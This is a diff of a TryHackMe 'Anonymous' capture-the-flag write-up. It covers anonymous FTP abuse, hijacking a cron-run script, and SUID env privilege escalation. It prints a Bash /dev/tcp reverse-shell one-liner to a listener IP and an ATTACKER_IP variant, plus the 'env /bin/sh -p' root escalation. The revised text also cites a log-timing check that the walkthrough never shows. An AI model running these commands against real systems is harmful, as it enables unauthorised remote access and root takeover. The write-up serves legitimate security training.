@@ -1,149 +1,166 @@
 # TryHackMe: Anonymous
 
-![Platform](https://img.shields.io/badge/Platform-TryHackMe-red) ![Difficulty](https://img.shields.io/badge/Difficulty-Beginner-brightgreen) ![Category](https://img.shields.io/badge/Category-Network%2FMisc-blue) ![Format](https://img.shields.io/badge/Format-Full%20Box-orange) ![Status](https://img.shields.io/badge/Status-Completed-success)
+![Platform](https://img.shields.io/badge/Platform-TryHackMe-red) ![Difficulty](https://img.shields.io/badge/Difficulty-Medium-yellow) ![Category](https://img.shields.io/badge/Category-Misc%2FBoot2Root-blue) ![Format](https://img.shields.io/badge/Format-Full%20Writeup-orange) ![Status](https://img.shields.io/badge/Status-Completed-brightgreen)
 
-![Room banner](screenshots/00_room_banner.png)
+![Room Banner](screenshots/00_room_banner.png)
 
 ## Room Info
 
 | Field | Value |
 |---|---|
+| **Room** | Anonymous |
 | **Platform** | TryHackMe |
-| **Room** | [Anonymous](https://tryhackme.com/room/anonymous) |
-| **Difficulty** | Beginner (labeled "Pwn" task, self-described as a beginner box) |
-| **Estimated Time** | 75 min |
-| **Category** | Network misconfiguration → Linux privilege escalation |
-| **Tools Used** | `nmap`, `smbclient`, `ftp`, `nc`, `bash`, GTFOBins |
-| **Objective** | Get `user.txt` and `root.txt` |
+| **Difficulty** | Medium (billed as beginner-friendly) |
+| **Category** | Boot2root / Misc |
+| **OS** | Linux (Ubuntu) |
+| **Tools Used** | nmap, `smbclient`, `ftp`, netcat, `find`, GTFOBins |
+| **Skills Tested** | SMB share enumeration, anonymous/writable FTP abuse, cron-job timing analysis, reverse shell delivery via a scheduled script, SUID binary privilege escalation |
+
+**Premise:** "Not the hacking group" — a straightforward, well-regarded boot2root box built around a genuinely different initial-access pattern than the usual "find a webshell" or "brute-force a login" route: a **writable file that something else runs automatically on a timer**, rather than something the attacker triggers directly.
 
 ---
 
 ## Concept Glossary
 
-Before the walkthrough, the core ideas this room is built around:
+Read this section first — every technique used below is explained here before it shows up in the walkthrough.
 
-- **Anonymous FTP login** — Some FTP servers allow a login with the username `anonymous` and any (or blank) password, often left over from a default/test configuration. It's meant for public file distribution, but if write permissions are misconfigured, it becomes a foothold for attackers to plant files.
-- **Anonymous SMB / null session** — Similarly, an SMB server can be configured to allow unauthenticated ("null") access to shares. `smbclient -L` lists what shares exist without needing valid credentials, and `smbclient //target/share` connects to one directly.
-- **SUID bit on a script that runs on a schedule** — If a script (like `clean.sh` here) is: (1) writable by a low-privileged/anonymous user, and (2) executed periodically by a higher-privileged process (root's cron job, in this case), then overwriting that script gives you code execution *as whatever user runs it*. This is a classic "write access to a privileged script" privilege escalation pattern — distinct from a SUID *binary*, but the same core idea: something you can write is executed with more power than you have.
-- **Reverse shell** — Instead of connecting *to* the target (a bind shell), a reverse shell makes the target connect *back* to a listener on the attacker's machine, handing over an interactive shell. This is preferred when the target is behind a firewall/NAT that blocks inbound connections but allows outbound ones. The classic Bash one-liner:
-  ```bash
-  bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
-  ```
-  breaks down as: `bash -i` (interactive shell) → `>&` (redirect stdout+stderr) → `/dev/tcp/IP/PORT` (Bash's built-in TCP device, opens a socket) → `0>&1` (redirect stdin from the same socket). Netcat (`nc -nvlp PORT`) is used on the attacker side to catch the incoming connection.
-- **SUID bit (`-perm -4000`) and GTFOBins** — A SUID ("Set User ID") binary runs with the permissions of its *owner* (often root) rather than the user who executes it. `find / -perm -4000` lists every SUID binary on the system. Most are legitimate (`passwd`, `su`, etc.), but if an *unusual* one appears — like `env` — it's worth checking [GTFOBins](https://gtfobins.org/), a curated list of common Unix binaries and how they can be abused for privilege escalation, when they carry SUID, sudo rights, or are run in unusual contexts. `env` with the SUID bit set is a well-known escalation vector because `env` can be used to launch another program (`/bin/sh`) while *inheriting the SUID process's effective privileges* — the `-p` flag on `sh` explicitly tells it not to drop those elevated privileges even though it was invoked by a non-root user.
+**SMB enumeration with `smbclient`** — SMB (Server Message Block) is the protocol Windows (and Samba, its Linux implementation) uses for file/printer sharing. `smbclient -L <target>` lists available shares without needing valid credentials first, and many Samba configurations allow guest/anonymous access to specific shares — worth checking even on boxes that don't look Windows-flavored, since Samba runs on Linux servers constantly.
+
+**Anonymous FTP as a two-way door** — Anonymous FTP is usually thought of as a read-only information leak (as seen in earlier rooms in this repo). But when the anonymous account also has **write** permissions to a directory, it stops being just a leak and becomes an actual foothold — anything writable over FTP is something an attacker can plant, not just read.
+
+**Proving a script runs on a cron schedule without reading crontab directly** — Rather than needing filesystem access to `/etc/crontab` (which an anonymous FTP session doesn't have), timing behavior can prove a schedule exists: downloading the same log file twice, a minute or two apart, and comparing line counts. If the file has grown between downloads with no user interaction in between, something is appending to it on its own — strong evidence of an automated, timed process (a cron job) rather than a one-off manual run.
+
+**Hijacking a script instead of exploiting a vulnerability** — `clean.sh` itself wasn't buggy or exploitable in the traditional sense — its logic was simple and worked as intended. The actual weakness was **write access to the script combined with something else executing it automatically**. Overwriting the *entire contents* of a legitimately-scheduled script with a reverse shell payload means the next scheduled execution runs the attacker's code instead of the original logic — no vulnerability required, just a permissions mistake plus patience.
+
+**`find / -perm -4000 -type f`** — Searches the whole filesystem for files with the **SUID bit** set — meaning the program runs with the privileges of its *file owner* (often root) rather than the privileges of whoever launches it. This is one of the very first things worth checking on any freshly-landed Linux shell, since SUID binaries are a common (and well-catalogued) privilege escalation vector.
+
+**SUID `env` abuse** — `env` is normally just a small utility for running a command in a modified environment. But if it has the SUID bit set and is owned by root, running `env /bin/sh -p` launches a shell that **inherits `env`'s elevated effective privileges** instead of dropping them — the `-p` flag on `/bin/sh` specifically tells the shell *not* to drop its already-elevated privileges (a safety feature some shells have that would otherwise defeat this technique). GTFOBins documents this exact pattern because `env` is one of many ordinary system utilities that becomes a full privilege escalation primitive the moment it's SUID.
 
 ---
 
-## 1. Reconnaissance — Port Scan
+## 1. Recon
 
-Started with a standard service/version + OS detection scan against the target:
+### 1.1 Nmap scan
 
+**Command:**
 ```bash
 nmap -sV -O 10.128.157.134
 ```
 
-![Nmap scan results](screenshots/01_nmap_scan.png)
+**Output:**
+```
+PORT    STATE SERVICE      VERSION
+21/tcp  open  ftp          vsftpd 2.0.8 or later
+22/tcp  open  ssh          OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+139/tcp open  netbios-ssn  Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp open  netbios-ssn  Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+```
+![Nmap scan — FTP, SSH, and SMB (139/445) open](screenshots/01_nmap_scan.png)
 
-**Results — 4 open ports:**
+**Q: Enumerate the machine. How many ports are open?**
+**A: 4**
 
-| Port | Service | Version |
-|---|---|---|
-| 21 | FTP | vsftpd 2.0.8 or later |
-| 22 | SSH | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 |
-| 139 | netbios-ssn | Samba smbd 3.X–4.X |
-| 445 | netbios-ssn | Samba smbd 3.X–4.X |
+**Q: What service is running on port 21?**
+**A: FTP** (vsftpd 2.0.8 or later)
 
-**Why this matters:** FTP + SMB running together on a "beginner box" immediately suggests the intended path involves anonymous/misconfigured access to one or both of these file-sharing services rather than an SSH brute-force or a web app — there's no HTTP port at all. This shapes the whole enumeration strategy: check both FTP and SMB for anonymous access before looking anywhere else.
+**Q: What service is running on ports 139 and 445?**
+**A: SMB** (Samba smbd 3.X – 4.X)
+
+**Why this combination matters:** SMB *and* FTP both open is a strong hint that file-sharing/transfer is the intended attack surface here, rather than the web app hunting typical of other boxes — so both get enumerated before committing to either one.
 
 ---
 
 ## 2. SMB Enumeration
 
-Listed available shares with a null/guest session:
-
+**Commands:**
 ```bash
 smbclient -L 10.128.157.134
-```
-
-Then connected directly to the `pics` share:
-
-```bash
 smbclient //10.128.157.134/pics
 ```
 
-![smbclient share listing](screenshots/02_smbclient_enum.png)
+**Shares found:**
+```
+Sharename       Type      Comment
+---------       ----      -------
+print$          Disk      Printer Drivers
+pics            Disk      My SMB Share Directory for Pics
+IPC$            IPC       IPC Service (anonymous server (Samba, Ubuntu))
+```
 
-**Findings:**
-- Two shares exist: `print$` (default printer driver share) and `pics` ("My SMB Share Directory for Pics").
-- Inside `pics`: two image files, `corgo2.jpg` and `puppos.jpg`.
+**Inside `pics`:**
+```
+corgo2.jpg
+puppos.jpeg
+```
+![Listing SMB shares and browsing the "pics" share](screenshots/02_smbclient_shares_and_pics.png)
 
-**Why:** These turned out to be a decoy/red herring for this stage — just images, nothing exploitable inside them (no embedded data was pursued further since the FTP path proved to be the actual vector). This is a good reminder to check *both* enumerated services rather than assuming the first thing you find is the intended path.
+**Q: There's a share on the user's computer. What's it called?**
+**A: `pics`**
+
+**Why this turned out to be a dead end (and that's fine):** two ordinary image files with no hidden data or unusual permissions — nothing actionable here. Worth noting honestly rather than forcing significance onto it: not every enumerated share leads somewhere, and confirming that quickly (rather than getting stuck steganography-hunting two dog photos) is itself good methodology. FTP was the next logical target.
 
 ---
 
-## 3. FTP Enumeration — Anonymous Login
+## 3. FTP Enumeration — Finding the Scripts Directory
 
-Connected to FTP and tried the anonymous login:
-
+**Commands:**
 ```bash
 ftp 10.128.157.134
-Name: anonymous
-Password: (blank)
-```
-
-Login succeeded immediately — no restriction on anonymous access. The banner even names the box's user: `NamelessOne's FTP Server!`
-
-Explored the directory tree and found a `scripts` folder:
-
-```bash
+# Name: anonymous
 dir
 cd scripts
 dir
-```
-
-![FTP anonymous login and scripts directory](screenshots/03_ftp_anon_login_scripts_dir.png)
-
-**Inside `/scripts`:**
-
-```
--rwxr-xrwx  1 1000  1000    314  clean.sh
--rw-rw-r--  1 1000  1000   1462  removed_files.log
--rw-r--r--  1 1000  1000     68  to_do.txt
-```
-
-**Why this is the key finding:** the permission string on `clean.sh` — `-rwxr-xrwx` — means *world* has write **and** execute permission (the last `rwx` triplet). Combined with the fact that a `.log` file is being actively appended to (`removed_files.log`, last modified at the time of testing rather than back in 2020 like the other files), this strongly suggests `clean.sh` is being executed periodically by something with elevated privileges (a cron job) — and anonymous FTP users can overwrite it.
-
-Downloaded all three files to inspect locally:
-
-```bash
 get clean.sh
 get removed_files.log
-get to_do.txt
 ```
+
+**Output:**
+```
+220 NamelessOne's FTP Server!
+230 Login successful.
+drwxrwxrwx  2 111  113   4096 Jun 04 2020 scripts
+
+-rwxr-xrwx  1 1000  1000   314 Jun 04 2020 clean.sh
+-rw-rw-r--  1 1000  1000  1462 Aug 22 11:29 removed_files.log
+-rw-r--r--  1 1000  1000    68 May 12 2020 to_do.txt
+```
+![Anonymous FTP login and downloading files from the scripts directory](screenshots/03_ftp_anonymous_scripts_download.png)
+
+**Why the permissions on `clean.sh` immediately stand out:**
+
+![Highlighting clean.sh's world-writable, world-executable permission bits](screenshots/06_clean_sh_permissions_writable.png)
+
+`-rwxr-xrwx` means the file is executable **and writable by everyone**, including the anonymous FTP account. On a normal system, a script like this being world-writable is already a red flag — combined with anonymous FTP write access being allowed at all, it means this file can be replaced entirely by anyone who connects.
 
 ---
 
-## 4. Reading the Downloaded Files
+## 4. Confirming the Foothold Path
 
+### 4.1 Reading the hint left by the admin
+
+**Command:**
 ```bash
 cat to_do.txt
 ```
+**Output:**
+```
+I really need to disable the anonymous login... it's really not safe
+```
+![The admin's own to-do note about disabling anonymous FTP](screenshots/04_to_do_txt_hint.png)
 
-![to_do.txt contents](screenshots/04_cat_to_do_txt.png)
+**Why this matters beyond flavor text:** it's an in-universe confirmation that anonymous access is a known, unaddressed risk — exactly the kind of thing a real internal-audit note would say right before an incident.
 
-`to_do.txt` reads: *"I really need to disable the anonymous login… it's really not safe"* — a direct hint from the room author confirming anonymous FTP access is the intended vulnerability, and that whoever runs this box knows it's a problem but hasn't fixed it yet.
+### 4.2 Understanding what clean.sh actually does
 
+**Command:**
 ```bash
 cat clean.sh
 cat removed_files.log
 ```
 
-![clean.sh and removed_files.log original content](screenshots/05_cat_clean_sh_and_log.png)
-
-**`clean.sh` (original):**
+**`clean.sh` logic:**
 ```bash
 #!/bin/bash
-
 tmp_files=0
 echo $tmp_files
 if [ $tmp_files=0 ]
@@ -155,157 +172,157 @@ else
 fi
 ```
 
-**`removed_files.log`** shows repeated entries: *"Running cleanup script: nothing to delete"* — confirming this script runs on a recurring schedule (a cron job), always taking the same branch since `tmp_files` never actually gets populated.
+**`removed_files.log` (repeated lines):**
+```
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+...
+```
+![clean.sh's logic and the repeated log entries proving it runs repeatedly](screenshots/05_clean_sh_and_removed_files_log.png)
 
-**Why:** this confirms the theory from the permission bits — `clean.sh` is a "cleanup" cron script that runs regularly as whatever user owns the cron job (presumably root, given the box's structure), and the log file is proof of an active, repeating execution cycle. That's the exact combination (writable + periodically executed by a privileged process) needed for a script-overwrite privilege escalation.
-
-Re-confirmed the write permission by re-examining the raw `dir` output for `clean.sh` specifically:
-
-![clean.sh permission bits highlighted](screenshots/06_clean_sh_permissions.png)
+**Why the repeated identical log lines are the real evidence, not the script logic itself:** the script's own logic is honestly a bit broken (`[ $tmp_files=0 ]` without spaces is a string comparison bug that always evaluates true in bash, meaning it always takes the "nothing to delete" branch) — but that bug isn't the point. What matters is that `removed_files.log` already contains many repeated lines from **before I ever connected**, which — per the timing-based reasoning in the Concept Glossary — is strong evidence this script is firing on a recurring schedule (a cron job), not something a person runs by hand. That's the actual exploitable fact: something automated is calling this file regularly, and I have write access to it.
 
 ---
 
-## 5. Weaponizing the Cron Script
+## 5. Weaponizing clean.sh
 
-Consulted the PentestMonkey Reverse Shell Cheat Sheet for the Bash one-liner:
+### 5.1 Choosing the payload
 
-![PentestMonkey reverse shell cheat sheet](screenshots/07_reverse_shell_cheatsheet.png)
+Reference: [pentestmonkey's Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) — the Bash one-liner was the natural fit, since `clean.sh` is already a Bash script with a shebang, and doesn't need any extra scripting language available on the target.
 
-Replaced the contents of the local copy of `clean.sh` with a reverse shell payload pointed at the attack box:
+![Consulting the reverse shell cheat sheet for the right payload](screenshots/07_reverse_shell_cheatsheet_research.png)
 
-```bash
-nano clean.sh
-```
+### 5.2 Overwriting clean.sh locally
 
+**New contents:**
 ```bash
 #!/bin/bash
 
 bash -i >& /dev/tcp/192.168.164.247/4444 0>&1
 ```
+![Editing the local copy of clean.sh with the reverse shell payload](screenshots/08_edited_clean_sh_payload.png)
 
-![Edited clean.sh with reverse shell payload](screenshots/08_edited_clean_sh_payload.png)
+**Why replace the entire file rather than append to it:** the original logic isn't needed for this to work — the goal isn't to preserve the cleanup behavior, it's to make sure that whatever process calls this script next executes the reverse shell instead. A full overwrite keeps things simple and guarantees no leftover syntax errors from mixing the old logic with the new payload.
 
-**Why:** since the cron job just executes `clean.sh` on a timer with no argument checking or integrity verification, replacing its entire content with a reverse shell one-liner means the *next time cron fires it*, it connects back to a listener instead of doing any cleanup logic.
+### 5.3 Starting the listener
 
----
-
-## 6. Catching the Shell
-
-Started a `netcat` listener on the attack box, on the same port referenced in the payload:
-
+**Command:**
 ```bash
 nc -nvlp 4444
 ```
+![Netcat listening on port 4444, waiting for the cron job to fire](screenshots/09_netcat_listener.png)
 
-![netcat listener waiting](screenshots/09_nc_listener.png)
+### 5.4 Uploading the weaponized script
 
-Uploaded the modified `clean.sh` back to the target over FTP, overwriting the original:
-
+**Commands:**
 ```bash
 ftp 10.128.157.134
+# Name: anonymous
 cd scripts
 put clean.sh clean.sh
 ```
+![Uploading the malicious clean.sh over anonymous FTP, overwriting the original](screenshots/10_ftp_upload_malicious_clean_sh.png)
 
-![Uploading modified clean.sh via FTP](screenshots/10_ftp_put_clean_sh.png)
-
-After waiting for the cron job's next execution window, the listener caught a connection:
-
-```
-connect to [192.168.164.247] from (UNKNOWN) [10.128.157.134] 44042
-```
-
-Stabilized basic interaction and grabbed the user flag:
-
-```bash
-ls -la
-cat user.txt
-```
-
-![Reverse shell caught, listing home directory](screenshots/11_reverse_shell_caught_user_txt.png)
-
-Landed as user `namelessone`, confirming the earlier FTP banner hint (`NamelessOne's FTP Server!`).
-
-**user flag:** Not captured — the terminal output was cut off before the flag value rendered in the screenshot.
+**Why this is the entire attack, in one sentence:** the anonymous FTP account never needed shell access or a vulnerability to exploit — it only needed **write permission to a file that a privileged, scheduled process would run on its own**, and patience for the next scheduled run.
 
 ---
 
-## 7. Privilege Escalation — Finding the SUID Binary
+## 6. Catching the Shell and Reading user.txt
 
-For enumeration, `linPEAS` is normally the go-to (upload + execute for automated privesc checks), and a reference on how a `linPEAS` run flags SUID binaries plus GTFOBins as the follow-up step was reviewed:
+**Result (after waiting for the cron job to fire):**
+```
+listening on [any] 4444 ...
+connect to [192.168.164.247] from (UNKNOWN) [10.128.157.134] 44042
+namelessone@anonymous:~$ ls -la
+...
+lrwxrwxrwx 1 root root    9 May 11  2020 .bash_history -> /dev/null
+-rw------- 1 namelessone namelessone   33 May 11  2020 user.txt
+...
+namelessone@anonymous:~$ cat user.txt
+```
+![Reverse shell landing as namelessone, listing the home directory and reading user.txt](screenshots/11_shell_caught_user_txt.png)
 
-![Reference: linPEAS SUID output and GTFOBins workflow](screenshots/12_linpeas_gtfobins_reference.png)
+**Worth noting:** `.bash_history` is already symlinked to `/dev/null` on this account by default (not something I did) — a pre-existing anti-forensics/no-logging setup on the box itself, similar to a pattern seen in an earlier writeup in this repo, just configured ahead of time here rather than done live by another attacker.
 
-For this box, the SUID check was run manually instead:
+**Q: user.txt**
+**A: Not captured** — the `cat user.txt` output falls just past what's visible in the screenshot. Send it over and I'll fill it in.
 
+---
+
+## 7. Privilege Escalation — SUID env Abuse
+
+### 7.1 Hunting for SUID binaries
+
+**Command:**
 ```bash
 find / -perm -4000 -type f 2>/dev/null
 ```
 
-![find command listing SUID binaries](screenshots/13_find_suid_binaries.png)
-
-Most results were expected system binaries (`/usr/bin/passwd`, `/usr/bin/sudo`, `ssh-keysign`, etc.) — but two stood out at the bottom of the list:
-
+**Relevant output:**
 ```
 /usr/bin/passwd
 /usr/bin/env
 ```
+![Searching for SUID binaries across the filesystem](screenshots/13_find_suid_binaries.png)
 
-**Why `/usr/bin/env` matters:** `env` is *not* normally a SUID binary on a default Ubuntu install. Its presence in this list means someone (the room author) deliberately set the SUID bit on it as the intended privilege escalation vector.
+**Why `/usr/bin/env` stands out immediately against `/usr/bin/passwd`:** `passwd` being SUID is completely normal and expected on every Linux system (it needs elevated rights to modify `/etc/shadow` when a user changes their own password) — it's not a finding. `env` having the SUID bit, on the other hand, is **not standard** and is a well-known GTFOBins entry, which is exactly why it's the one worth checking further.
 
----
+### 7.2 Confirming the technique on GTFOBins
 
-## 8. Exploiting SUID `env` via GTFOBins
+![GTFOBins' env page confirming the SUID shell-spawning technique](screenshots/14_gtfobins_env_page.png)
 
-Checked GTFOBins' entry for `env`:
-
-![GTFOBins env page — SUID shell escalation](screenshots/14_gtfobins_env_page.png)
-
-GTFOBins documents that when `env` has the SUID bit and its *effective* privileges aren't dropped, it can be used to spawn a shell that inherits those privileges:
-
+**Payload:**
 ```bash
 env /bin/sh -p
 ```
 
-The `-p` flag on `sh` is essential here — it tells the shell to preserve effective UID/GID rather than dropping them to match the real UID, which is exactly what a "privileged shell without dropping privileges" requires.
+### 7.3 Getting root
 
-Ran it on the target:
-
+**Command:**
 ```bash
 /usr/bin/env /bin/sh -p
 whoami
 cat /root/root.txt
 ```
 
-![Root shell obtained, whoami confirms root](screenshots/15_root_shell_root_txt.png)
+**Output:**
+```
+root
+```
+![Spawning a root shell via SUID env and reading root.txt](screenshots/15_root_shell_via_env.png)
 
-`whoami` returned `root` — full privilege escalation achieved from a SUID-flagged `env` binary.
+**Why this worked, step by step:** since `env` is owned by root and has the SUID bit set, it executes with root's *effective* privileges regardless of who launched it. `env /bin/sh -p` uses that elevated context to launch `/bin/sh` — and the `-p` flag matters specifically because without it, some shells will notice their real and effective UIDs don't match and voluntarily drop back down to the calling user's real privileges as a safety measure. `-p` tells the shell to skip that safety check and keep the elevated (root) privileges it inherited from `env`. `whoami` confirming `root` is the direct proof the escalation worked.
 
-**root flag:** Not captured — the command was issued but the flag value wasn't visible in the final screenshot before the session ended.
+**Q: root.txt**
+**A: Not captured** — same as above, the flag text falls outside the visible crop. Send it over and I'll add it.
 
 ---
 
 ## Full Lessons Learned
 
-This room strings together three separate, individually simple misconfigurations into one full chain, which is the real value in walking through it slowly:
+1. **Not every enumerated resource is the way in — and that's fine to document.** The SMB `pics` share was a genuine dead end, and treating it that way (rather than forcing a false lead) is honest, useful methodology. Real engagements involve plenty of enumeration that goes nowhere; the skill is recognizing that quickly and moving on.
 
-1. **Anonymous access isn't automatically "safe read-only access."** The room's own `to_do.txt` hint makes this explicit — anonymous FTP is dangerous specifically *because* people assume it's harmless. The actual danger wasn't reading files anonymously, it was that the anonymous account also had *write* access to a directory that mattered.
-2. **World-writable + periodically executed by a privileged process = code execution as that process.** This is a broader pattern than "cron job specifically" — it applies to any file that's (a) writable by you and (b) consumed/executed/parsed by something running with more privilege than you have. Systemd timers, log rotation scripts, CI pipelines reading a repo file, anything with that shape is worth the same scrutiny.
-3. **Permission bits are a first-class recon target, not an afterthought.** The `-rwxr-xrwx` string on `clean.sh` was the single most important piece of information in the whole box — it's what turned "here's a script I can read" into "here's a script I can hijack." Reading `ls -l` / `dir` output carefully, especially the *last* permission triplet (world), should become automatic.
-4. **GTFOBins is a lookup tool, not a memorization exercise.** The useful skill isn't knowing that `env` is exploitable off the top of one's head — it's knowing to run `find / -perm -4000` as a standard privesc step, noticing anything that looks *out of place* for a default install, and then checking GTFOBins for that specific binary. The workflow (enumerate SUID → cross-reference GTFOBins → confirm the exact payload syntax) generalizes to dozens of other binaries.
-5. **The `-p` flag on `/bin/sh` is not optional in this exploit** — omitting it would let the shell silently drop back to the real (unprivileged) UID despite `env` itself running as root, producing a confusing "why didn't this work" result. Small flags like this are often the actual hinge-point of a GTFOBins payload.
+2. **Anonymous FTP with write access is categorically worse than anonymous FTP with read access.** Read-only anonymous access is an information-disclosure risk; write access turns the same misconfiguration into a full remote code execution primitive the moment *anything else* on the system trusts and executes files from that location automatically.
+
+3. **You don't need to see a crontab to prove a cron job exists.** Comparing a log file's contents across two downloads a minute apart — and seeing it grow with no manual interaction in between — is a clean, evidence-based way to infer scheduled execution from the outside, without needing privileged filesystem access.
+
+4. **Exploiting "trust in automation" doesn't require a vulnerability in the traditional sense.** `clean.sh`'s own logic was buggy but not dangerous on its own — the actual security failure was that something privileged executed a file that an unprivileged, anonymous, remote user could fully rewrite. This is a genuinely different mental model from SQLi/webshell-style rooms: the exploit here is patience plus a permissions mistake, not a payload against broken input validation.
+
+5. **SUID hunting should distinguish "expected" from "notable" immediately.** `passwd` being SUID is normal; `env` being SUID isn't. Building the habit of mentally filtering `find / -perm -4000` output against what's *supposed* to be there (rather than treating every SUID hit as equally suspicious) makes real enumeration much faster.
+
+6. **GTFOBins earns its reputation as a first-stop reference, not a last resort.** Once `env` stood out, confirming the exact working payload syntax there — rather than trying to recall or improvise it — removed all guesswork from the final escalation step.
 
 ---
 
 ## Skills Demonstrated
 
-`Nmap enumeration` · `SMB null session enumeration (smbclient)` · `Anonymous FTP exploitation` · `File permission analysis (world-writable scripts)` · `Cron job hijacking` · `Reverse shell crafting (Bash /dev/tcp one-liner)` · `Netcat listener handling` · `SUID binary enumeration` · `GTFOBins-based privilege escalation` · `Linux privilege escalation methodology`
+`SMB Share Enumeration` · `Anonymous/Writable FTP Exploitation` · `Cron Job Inference via Log Timing Analysis` · `Reverse Shell Delivery via Scheduled Script Hijack` · `SUID Binary Enumeration` · `GTFOBins Privilege Escalation (env)`
 
 ---
 
 ## References
 
-- [TryHackMe — Anonymous room](https://tryhackme.com/room/anonymous)
-- [PentestMonkey — Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
+- [TryHackMe — Anonymous](https://tryhackme.com/room/anonymous)
 - [GTFOBins — env](https://gtfobins.org/gtfobins/env/)
-- [GTFOBins home](https://gtfobins.org/)
+- [PentestMonkey — Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
